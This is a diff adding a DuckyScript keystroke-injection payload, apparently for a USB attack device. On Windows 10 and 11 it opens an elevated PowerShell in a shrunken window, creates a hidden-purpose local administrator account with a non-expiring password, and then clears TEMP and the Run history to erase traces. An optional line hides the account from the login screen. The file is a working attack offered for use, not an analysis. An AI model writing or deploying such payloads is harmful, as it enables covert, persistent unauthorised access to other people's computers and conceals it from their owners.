@@ -1,0 +1,37 @@
+REM Title: Add_Local_Admin_Speed
+REM Author: LulzAnarchyAnon
+REM Modified By: tunnelcat
+REM Description: Administrator PowerShell is opened, and resized for a more stealthy payload delivery, then the payload
+REM creates a local admin account on the target system, afterwards powershell exits, and all history is cleared. 
+REM This is a faster payload that focuses more pure speed than reliability. Delays are shorter.
+REM It doesn't check for the case where the username already exists to save time (usually the case anyways...)
+REM Target: Windows 10 and 11  
+REM Props: Darren Kitchen, and I am Jakoby
+REM Version: 4.0
+REM Category: Execution
+
+REM Optional command (add at the end before exit): this hides the user from the control panel, lock screen, etc. but you might have trouble logging in physically
+REM reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /v $Username /t REG_DWORD /d 0 /f
+
+DELAY 350
+GUI r
+DELAY 350
+STRINGLN powershell -Command "Start-Process PowerShell -Verb RunAs"  
+DELAY 650
+ALT y
+DELAY 650
+STRINGLN
+                 PowerShell.exe -c ". mode.com con: lines=5 cols=20"
+                 $Username = "UtilityAccount"
+                 $Password = "Attacker@123!"
+                 $group = "Administrators"
+                 & NET USER $Username $Password /add /y /expires:never
+                 & NET LOCALGROUP $group $Username /add
+                 & WMIC USERACCOUNT WHERE "Name='$Username'" SET PasswordExpires=FALSE
+                 reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DisableBackButton /t REG_DWORD /d 0 /f
+                 rm $env:TEMP\* -r -Force -ErrorAction SilentlyContinue
+                 reg delete "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" /va /f
+                 exit
+                 exit
+                 exit
+END_STRINGLN
